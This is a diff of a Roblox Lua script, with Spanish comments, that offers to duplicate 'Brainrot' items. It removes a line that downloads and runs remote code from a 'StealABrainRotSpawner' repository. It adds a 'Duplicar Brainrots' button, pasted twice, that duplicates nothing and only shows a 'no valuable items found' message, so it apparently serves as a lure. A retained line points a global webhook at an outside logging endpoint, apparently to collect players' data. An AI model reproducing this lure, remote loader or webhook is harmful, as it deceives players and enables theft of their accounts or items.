@@ -1,4 +1,45 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Crypoth/StealABrainRotSpawner/refs/heads/main/XwareSpawner"))()
+-- Crear ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Crear botón
+local boton = Instance.new("TextButton")
+boton.Size = UDim2.new(0, 200, 0, 50)
+boton.Position = UDim2.new(0.5, -100, 0.5, -25)
+boton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+boton.TextColor3 = Color3.fromRGB(255, 255, 255)
+boton.Text = "Duplicar Brainrots"
+boton.Parent = screenGui
+-- Crear ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Crear botón
+local boton = Instance.new("TextButton")
+boton.Size = UDim2.new(0, 200, 0, 50)
+boton.Position = UDim2.new(0.5, -100, 0.5, -25)
+boton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+boton.TextColor3 = Color3.fromRGB(255, 255, 255)
+boton.Text = "Duplicar Brainrots"
+boton.Parent = screenGui
+
+-- Crear mensaje
+local mensaje = Instance.new("TextLabel")
+mensaje.Size = UDim2.new(0, 300, 0, 50)
+mensaje.Position = UDim2.new(0.5, -150, 0.5, 40)
+mensaje.BackgroundTransparency = 1
+mensaje.TextColor3 = Color3.fromRGB(255, 80, 80)
+mensaje.TextScaled = true
+mensaje.Visible = false
+mensaje.Text = "No se encontraron brainrots de valor para duplicar"
+mensaje.Parent = screenGui
+
+-- Función del botón
+boton.MouseButton1Click:Connect(function()
+	mensaje.Visible = true
+	wait(2)
+	mensaje.Visible = false
+end)
 
 
 getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_69201cb343644b71a9b62af1bbad7be2"
